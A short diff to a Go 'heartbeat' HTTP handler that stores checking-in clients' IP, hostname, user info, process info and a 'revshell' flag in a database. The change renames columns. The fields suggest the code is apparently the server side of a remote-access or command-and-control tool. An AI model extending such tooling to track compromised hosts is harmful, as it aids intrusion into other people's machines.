@@ -54,10 +54,10 @@ func heartbeat(w http.ResponseWriter, r *http.Request) {
 	err := db.QueryRow("SELECT ip FROM clients WHERE ip = ?", clientIP).Scan(&existingIP)
 
 	if err == sql.ErrNoRows {
-		_, err = db.Exec(`INSERT INTO clients (ip, hostname, username, process_name, pid, last_seen, revshell)
-			VALUES (?, ?, ?, ?, ?, ?, 0)`,
+		_, err = db.Exec(`INSERT INTO clients (ip, hostname, userinfo, processinfo, last_seen, revshell)
+			VALUES (?, ?, ?, ?, ?, 0)`,
 			clientIP, heartbeatData.Hostname, heartbeatData.UserInfo,
-			heartbeatData.ProcessInfo, "", time.Now().Format(time.RFC3339))
+			heartbeatData.ProcessInfo, time.Now().Format(time.RFC3339))
 
 		if err != nil {
 			log.Printf("添加新客户端失败: %v", err)
@@ -71,9 +71,9 @@ func heartbeat(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusInternalServerError)
 		return
 	} else {
-		_, err = db.Exec(`UPDATE clients SET hostname=?, username=?, process_name=?, pid=?, last_seen=? WHERE ip=?`,
+		_, err = db.Exec(`UPDATE clients SET hostname=?, userinfo=?, processinfo=?, last_seen=? WHERE ip=?`,
 			heartbeatData.Hostname, heartbeatData.UserInfo, heartbeatData.ProcessInfo,
-			"", time.Now().Format(time.RFC3339), clientIP)
+			time.Now().Format(time.RFC3339), clientIP)
 
 		if err != nil {
 			log.Printf("更新客户端失败: %v", err)
